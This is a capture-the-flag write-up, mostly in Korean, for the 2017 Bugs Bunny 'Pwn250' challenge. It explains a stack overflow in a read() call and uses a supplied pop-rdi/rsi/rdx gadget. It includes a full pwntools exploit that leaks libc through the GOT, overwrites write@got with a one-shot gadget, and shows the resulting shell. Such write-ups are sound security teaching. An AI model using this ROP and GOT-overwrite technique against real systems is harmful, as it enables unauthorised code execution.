# 2017 bugsbunny - [PWN] Pwn250

## Key words

- 64bit One-shot gadget
- rdi, rsi, edx

## Check Security

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

```c
ssize_t here()
{
  char buf; // [sp+0h] [bp-80h]@1

  return read(0, &buf, 0x100uLL);
}
```

심플 합니다. 추가적으로 `foryou`라는 함수에서 `pop rdi, pop rsi, pop rdx, retn`의 가젯을 주기 때문에 이를 이용해서 쉽게 `64bit ROP Chain`을 구성할 수 있습니다.

```
.text:0000000000400566                 public foryou
.text:0000000000400566 foryou          proc near
.text:0000000000400566                 push    rbp
.text:0000000000400567                 mov     rbp, rsp
.text:000000000040056A                 pop     rdi
.text:000000000040056B                 pop     rsi
.text:000000000040056C                 pop     rdx
.text:000000000040056D                 retn
```

추가적으로, 바이너리가 `Partial RELRO`이기 때문에 `got`를 덮을 수 있다는 것을 이용하여 `write@got`를 `one-shot gadget`으로 덮고 `write`함수를 실행 시켜 쉘을 얻었습니다.

## Exploit Code

```python
from pwn import *

target = "./pwn250"

p = process(target)
e = ELF(target)

# pop rdi, pop rsi, pop rdx, ret
magic_addr = 0x40056a

payload = "A" * 0x80
payload += "B" * 8
payload += p64(magic_addr)
payload += p64(1)
payload += p64(e.got['__libc_start_main'])
payload += p64(8)
payload += p64(e.plt['write'])
payload += p64(magic_addr)
payload += p64(0)
payload += p64(e.got['write'])
payload += p64(8)
payload += p64(e.plt['read'])
payload += p64(e.plt['write'])

p.send(payload)

recv = u64(p.recv().ljust(8, "\x00"))
libc_base = recv - 0x20740
one_shot = libc_base + 0x4526A

log.info("libc base : {}".format(hex(libc_base)))
log.info("one_shot  : {}".format(hex(one_shot)))

p.send(p64(one_shot))

p.interactive()
```

## Result

```
tbkim@ubuntu:~/ctf/pwnable/0016_2017_bugsbunny_pwn250$ python sol_pwn250.py 
[+] Starting local process './pwn250': pid 5543
[*] '/home/tbkim/ctf/pwnable/0016_2017_bugsbunny_pwn250/pwn250'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] libc base : 0x7f6c3d983000
[*] one_shot  : 0x7f6c3d9c826a
[*] Switching to interactive mode
$ id
uid=1000(tbkim) gid=1000(tbkim) groups=1000(tbkim)
```